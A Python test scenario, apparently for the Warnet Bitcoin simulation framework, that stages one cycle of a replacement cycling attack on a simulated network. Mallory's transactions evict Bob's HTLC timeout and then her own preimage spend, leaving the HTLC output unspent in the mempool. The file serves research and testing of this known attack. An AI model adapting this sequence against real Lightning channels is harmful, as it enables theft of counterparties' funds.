#!/usr/bin/env python3

"""
Test scenario: One complete replacement cycling attack cycle.

Full sequence:
  1. Create HTLC output (confirmed)
  2. Create Box M (confirmed)
  3. Broadcast m_child (spends Box M → mempool)
  4. Broadcast htlc_timeout (Bob spends HTLC output → mempool)
  5. Broadcast htlc_preimage (Mallory spends HTLC + Box M → evicts timeout + m_child)
  6. Broadcast cycle_out (Mallory spends Box M only → evicts htlc_preimage)
  7. HTLC output is ORPHANED — nothing in mempool spends it

Run: warnet run scenarios/test_single_cycle.py --debug

Assertions after cycle_out:
  - htlc_preimage is NOT in the mempool
  - htlc_timeout is NOT in the mempool
  - cycle_out IS in the mempool
  - htlc_output is UNSPENT — no tx in the mempool references it
"""

import hashlib
from typing import Dict, Tuple

from commander import Commander
from test_framework.test_node import TestNode
from test_framework.key import ECKey


# ---------------------------------------------------------------------------
# Helpers — wallet, funding, keys (proven in prior tests)
# ---------------------------------------------------------------------------

def setup_wallets(alice: TestNode, bob: TestNode, mallory: TestNode) -> None:
    for node, name in [(alice, "alice"), (bob, "bob"), (mallory, "mallory")]:
        wallets = node.listwallets()
        if name not in wallets:
            node.createwallet(name, descriptors=True)


def fund_miner(alice: TestNode, blocks: int = 101) -> str:
    addr: str = alice.getnewaddress()
    alice.rpc.generatetoaddress(blocks, addr)
    return addr


def fund_participants(
    alice: TestNode, bob: TestNode, mallory: TestNode,
    miner_addr: str, amount: float = 10.0,
) -> Tuple[str, str]:
    bob_addr: str = bob.getnewaddress()
    mallory_addr: str = mallory.getnewaddress()
    alice.sendtoaddress(bob_addr, amount)
    alice.sendtoaddress(mallory_addr, amount)
    alice.rpc.generatetoaddress(1, miner_addr)
    return bob_addr, mallory_addr


def generate_keypair() -> Tuple[ECKey, str]:
    key: ECKey = ECKey()
    key.generate(compressed=True)
    return key, key.get_pubkey().get_bytes().hex()


def eckey_to_wif(key: ECKey, testnet: bool = True) -> str:
    prefix: bytes = b'\xef' if testnet else b'\x80'
    extended: bytes = prefix + key.get_bytes() + b'\x01'
    checksum: bytes = hashlib.sha256(hashlib.sha256(extended).digest()).digest()[:4]
    return _base58_encode(extended + checksum)


def _base58_encode(data: bytes) -> str:
    alphabet: str = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num: int = int.from_bytes(data, 'big')
    result: str = ''
    while num > 0:
        num, remainder = divmod(num, 58)
        result = alphabet[remainder] + result
    for byte in data:
        if byte == 0:
            result = '1' + result
        else:
            break
    return result


# ---------------------------------------------------------------------------
# Helpers — HTLC output
# ---------------------------------------------------------------------------

def create_htlc_output(
    alice: TestNode, miner_addr: str, htlc_amount: float = 1.0,
) -> Dict[str, object]:
    bob_key, bob_pubkey = generate_keypair()
    mallory_key, mallory_pubkey = generate_keypair()

    multisig: dict = alice.createmultisig(2, [bob_pubkey, mallory_pubkey])
    htlc_txid: str = alice.sendtoaddress(multisig["address"], htlc_amount)
    alice.rpc.generatetoaddress(1, miner_addr)

    wallet_tx: dict = alice.gettransaction(htlc_txid)
    decoded: dict = alice.decoderawtransaction(wallet_tx["hex"])
    htlc_vout: int = None
    htlc_scriptPubKey: str = None
    for vout in decoded["vout"]:
        if abs(float(vout["value"]) - htlc_amount) < 0.0001:
            htlc_vout = vout["n"]
            htlc_scriptPubKey = vout["scriptPubKey"]["hex"]
            break
    assert htlc_vout is not None, "Could not find HTLC output"

    return {
        "htlc_txid": htlc_txid, "htlc_vout": htlc_vout,
        "htlc_amount": htlc_amount, "htlc_scriptPubKey": htlc_scriptPubKey,
        "redeem_script": multisig["redeemScript"], "multisig_address": multisig["address"],
        "bob_pubkey": bob_pubkey, "mallory_pubkey": mallory_pubkey,
        "bob_wif": eckey_to_wif(bob_key), "mallory_wif": eckey_to_wif(mallory_key),
    }


# ---------------------------------------------------------------------------
# Helpers — Box M and M-child
# ---------------------------------------------------------------------------

def create_box_m(
    alice: TestNode, mallory: TestNode, miner_addr: str, amount: float = 0.1,
) -> Dict[str, object]:
    mallory_addr: str = mallory.getnewaddress()
    box_m_txid: str = alice.sendtoaddress(mallory_addr, amount)
    alice.rpc.generatetoaddress(1, miner_addr)

    wallet_tx: dict = alice.gettransaction(box_m_txid)
    decoded: dict = alice.decoderawtransaction(wallet_tx["hex"])
    for vout in decoded["vout"]:
        if vout["scriptPubKey"].get("address") == mallory_addr:
            return {
                "box_m_txid": box_m_txid, "box_m_vout": vout["n"],
                "box_m_amount": float(vout["value"]), "box_m_address": mallory_addr,
                "box_m_scriptPubKey": vout["scriptPubKey"]["hex"],
            }
    raise AssertionError("Could not find Box M output")


def create_m_child(
    mallory: TestNode, box_m: Dict[str, object], fee_rate_sat_vb: int = 1,
) -> Dict[str, str]:
    mallory_addr: str = mallory.getnewaddress()
    fee_btc: float = (fee_rate_sat_vb * 150) / 1e8
    raw_hex: str = mallory.createrawtransaction(
        [{"txid": box_m["box_m_txid"], "vout": box_m["box_m_vout"], "sequence": 0xFFFFFFFD}],
        {mallory_addr: round(box_m["box_m_amount"] - fee_btc, 8)},
    )
    signed: dict = mallory.signrawtransactionwithwallet(raw_hex)
    assert signed["complete"], f"m_child signing failed"
    m_child_txid: str = mallory.sendrawtransaction(signed["hex"])
    return {"m_child_txid": m_child_txid, "m_child_hex": signed["hex"]}


# ---------------------------------------------------------------------------
# Helpers — htlc_timeout
# ---------------------------------------------------------------------------

def create_htlc_timeout(
    node: TestNode, htlc: Dict[str, object],
    dest_address: str, fee_rate_sat_vb: int = 2,
) -> Dict[str, object]:
    fee_btc: float = (fee_rate_sat_vb * 300) / 1e8
    raw_hex: str = node.createrawtransaction(
        [{"txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"], "sequence": 0xFFFFFFFD}],
        {dest_address: round(htlc["htlc_amount"] - fee_btc, 8)},
    )
    prevtxs: list = [{
        "txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"],
        "scriptPubKey": htlc["htlc_scriptPubKey"],
        "redeemScript": htlc["redeem_script"], "amount": htlc["htlc_amount"],
    }]
    signed: dict = node.signrawtransactionwithkey(
        raw_hex, [htlc["bob_wif"], htlc["mallory_wif"]], prevtxs,
    )
    assert signed["complete"], f"htlc_timeout signing failed"
    return {"htlc_timeout_hex": signed["hex"], "htlc_timeout_fee": fee_btc}


# ---------------------------------------------------------------------------
# Helpers — htlc_preimage
# ---------------------------------------------------------------------------

def create_htlc_preimage(
    node: TestNode, htlc: Dict[str, object], box_m: Dict[str, object],
    mallory: TestNode, dest_address: str, fee_rate_sat_vb: int = 10,
) -> Dict[str, object]:
    total_input: float = htlc["htlc_amount"] + box_m["box_m_amount"]
    fee_btc: float = (fee_rate_sat_vb * 400) / 1e8

    raw_hex: str = node.createrawtransaction(
        [
            {"txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"], "sequence": 0xFFFFFFFD},
            {"txid": box_m["box_m_txid"], "vout": box_m["box_m_vout"], "sequence": 0xFFFFFFFD},
        ],
        {dest_address: round(total_input - fee_btc, 8)},
    )
    prevtxs: list = [
        {"txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"],
         "scriptPubKey": htlc["htlc_scriptPubKey"],
         "redeemScript": htlc["redeem_script"], "amount": htlc["htlc_amount"]},
        {"txid": box_m["box_m_txid"], "vout": box_m["box_m_vout"],
         "scriptPubKey": box_m["box_m_scriptPubKey"], "amount": box_m["box_m_amount"]},
    ]
    partially_signed: dict = node.signrawtransactionwithkey(
        raw_hex, [htlc["bob_wif"], htlc["mallory_wif"]], prevtxs,
    )
    fully_signed: dict = mallory.signrawtransactionwithwallet(partially_signed["hex"])
    assert fully_signed["complete"], f"htlc_preimage signing failed: {fully_signed.get('errors')}"

    return {"htlc_preimage_hex": fully_signed["hex"], "htlc_preimage_fee": fee_btc}


# ---------------------------------------------------------------------------
# Helpers — cycle_out (NEW)
# ---------------------------------------------------------------------------

def create_cycle_out(
    mallory: TestNode,
    box_m: Dict[str, object],
    preimage_fee_btc: float,
    fee_rate_sat_vb: int = 20,
) -> Dict[str, object]:
    """
    Create Mallory's cycle-out transaction.

    Spends Box M with a higher fee than htlc_preimage, evicting it.
    After this, NOTHING in the mempool spends htlc_output — it is orphaned.

    CRITICAL: Fee must exceed htlc_preimage's absolute fee.
    """
    mallory_addr: str = mallory.getnewaddress()
    tx_size_vb: int = 150
    fee_btc: float = (fee_rate_sat_vb * tx_size_vb) / 1e8

    assert fee_btc > preimage_fee_btc, (
        f"cycle_out fee ({fee_btc}) must exceed preimage fee ({preimage_fee_btc})"
    )

    raw_hex: str = mallory.createrawtransaction(
        [{"txid": box_m["box_m_txid"], "vout": box_m["box_m_vout"], "sequence": 0xFFFFFFFD}],
        {mallory_addr: round(box_m["box_m_amount"] - fee_btc, 8)},
    )
    signed: dict = mallory.signrawtransactionwithwallet(raw_hex)
    assert signed["complete"], f"cycle_out signing failed"

    cycle_out_txid: str = mallory.sendrawtransaction(signed["hex"])
    return {
        "cycle_out_txid": cycle_out_txid,
        "cycle_out_hex": signed["hex"],
        "cycle_out_fee": fee_btc,
    }


# ---------------------------------------------------------------------------
# Helpers — verification
# ---------------------------------------------------------------------------

def verify_htlc_output_orphaned(
    node: TestNode, htlc: Dict[str, object],
) -> None:
    """Assert that no transaction in the mempool spends htlc_output."""
    mempool_txids: list = node.getrawmempool()
    for txid in mempool_txids:
        # getrawtransaction works for mempool txs without txindex
        raw_tx: str = node.getrawtransaction(txid)
        decoded: dict = node.decoderawtransaction(raw_tx)
        for vin in decoded["vin"]:
            if vin["txid"] == htlc["htlc_txid"] and vin["vout"] == htlc["htlc_vout"]:
                raise AssertionError(
                    f"htlc_output is NOT orphaned — spent by {txid[:16]}... in mempool"
                )


# ---------------------------------------------------------------------------
# Scenario
# ---------------------------------------------------------------------------

class TestSingleCycle(Commander):

    def set_test_params(self) -> None:
        self.num_nodes = 3

    def add_options(self, parser) -> None:
        parser.description = "Test one complete replacement cycling attack cycle"
        parser.usage = "warnet run /path/to/test_single_cycle.py"

    def run_test(self) -> None:
        self.log.info("Waiting for L1 p2p network connections...")
        self.wait_for_tanks_connected()

        alice: TestNode = self.nodes[0]
        bob: TestNode = self.nodes[1]
        mallory: TestNode = self.nodes[2]

        # --- Setup ---
        self.log.info("Setting up wallets and funding...")
        setup_wallets(alice, bob, mallory)
        miner_addr: str = fund_miner(alice, blocks=101)
        fund_participants(alice, bob, mallory, miner_addr, amount=10.0)

        # --- Step 1: Create HTLC output ---
        self.log.info("[1] Creating HTLC output (1.0 BTC)...")
        htlc: dict = create_htlc_output(alice, miner_addr, htlc_amount=1.0)
        self.log.info(f"    HTLC: {htlc['htlc_txid'][:16]}...:{htlc['htlc_vout']}")

        # --- Step 2: Create Box M ---
        self.log.info("[2] Creating Box M...")
        box_m: dict = create_box_m(alice, mallory, miner_addr, amount=0.1)
        self.log.info(f"    Box M: {box_m['box_m_txid'][:16]}...:{box_m['box_m_vout']}")

        # --- Step 3: Broadcast m_child ---
        self.log.info("[3] Broadcasting m_child (spends Box M)...")
        m_child: dict = create_m_child(mallory, box_m, fee_rate_sat_vb=1)
        self.sync_all()
        self.log.info(f"    m_child: {m_child['m_child_txid'][:16]}...")

        # --- Step 4: Broadcast htlc_timeout ---
        bob_dest: str = bob.getnewaddress()
        self.log.info("[4] Broadcasting htlc_timeout (Bob spends HTLC)...")
        timeout: dict = create_htlc_timeout(bob, htlc, bob_dest, fee_rate_sat_vb=2)
        timeout_txid: str = bob.sendrawtransaction(timeout["htlc_timeout_hex"])
        self.sync_all()
        self.log.info(f"    htlc_timeout: {timeout_txid[:16]}...")

        # Verify mempool state before attack
        mempool: list = alice.getrawmempool()
        assert len(mempool) == 2, f"Expected 2 txs in mempool, got {len(mempool)}"
        self.log.info(f"    Mempool: {len(mempool)} txs (m_child + htlc_timeout)")

        # --- Step 5: Broadcast htlc_preimage (REPLACEMENT) ---
        mallory_dest: str = mallory.getnewaddress()
        self.log.info("[5] Broadcasting htlc_preimage (evicts timeout + m_child)...")
        preimage: dict = create_htlc_preimage(
            alice, htlc, box_m, mallory, mallory_dest, fee_rate_sat_vb=10,
        )
        preimage_txid: str = mallory.sendrawtransaction(preimage["htlc_preimage_hex"])
        self.sync_all()
        self.log.info(f"    htlc_preimage: {preimage_txid[:16]}...")

        # Verify replacement
        mempool: list = alice.getrawmempool()
        assert preimage_txid in mempool, "htlc_preimage not in mempool"
        assert timeout_txid not in mempool, "htlc_timeout should be evicted"
        assert m_child["m_child_txid"] not in mempool, "m_child should be evicted"
        self.log.info("    ✓ htlc_timeout EVICTED")
        self.log.info("    ✓ m_child EVICTED")
        self.log.info("    ✓ htlc_preimage IN MEMPOOL")

        # --- Step 6: Broadcast cycle_out (EVICTS htlc_preimage) ---
        self.log.info("[6] Broadcasting cycle_out (evicts htlc_preimage)...")
        cycle_out: dict = create_cycle_out(
            mallory, box_m, preimage["htlc_preimage_fee"], fee_rate_sat_vb=30,
        )
        self.sync_all()
        self.log.info(f"    cycle_out: {cycle_out['cycle_out_txid'][:16]}...")

        # --- CRITICAL: Verify HTLC output is orphaned ---
        mempool: list = alice.getrawmempool()

        assert cycle_out["cycle_out_txid"] in mempool, "cycle_out not in mempool"
        self.log.info("    ✓ cycle_out IN MEMPOOL")

        assert preimage_txid not in mempool, "htlc_preimage should be evicted by cycle_out"
        self.log.info("    ✓ htlc_preimage EVICTED")

        assert timeout_txid not in mempool, "htlc_timeout should still be evicted"
        self.log.info("    ✓ htlc_timeout still EVICTED")

        # THE MOMENT OF TRUTH: Is the HTLC output orphaned?
        verify_htlc_output_orphaned(alice, htlc)
        self.log.info("    ✓ htlc_output is ORPHANED — no spender in mempool")

        # --- Summary ---
        self.log.info("========================================")
        self.log.info("  SINGLE CYCLE — ALL ASSERTIONS PASSED")
        self.log.info("========================================")
        self.log.info(f"  HTLC output:     {htlc['htlc_txid'][:16]}...:{htlc['htlc_vout']}")
        self.log.info(f"  m_child:         EVICTED")
        self.log.info(f"  htlc_timeout:    EVICTED")
        self.log.info(f"  htlc_preimage:   EVICTED (by cycle_out)")
        self.log.info(f"  cycle_out:       IN MEMPOOL")
        self.log.info(f"  htlc_output:     ORPHANED")
        self.log.info(f"  Mempool txs:     {len(mempool)}")
        self.log.info("========================================")
        self.log.info("  REPLACEMENT CYCLING ATTACK — 1 CYCLE COMPLETE")
        self.log.info("========================================")


def main():
    TestSingleCycle().main()


if __name__ == "__main__":
    main()
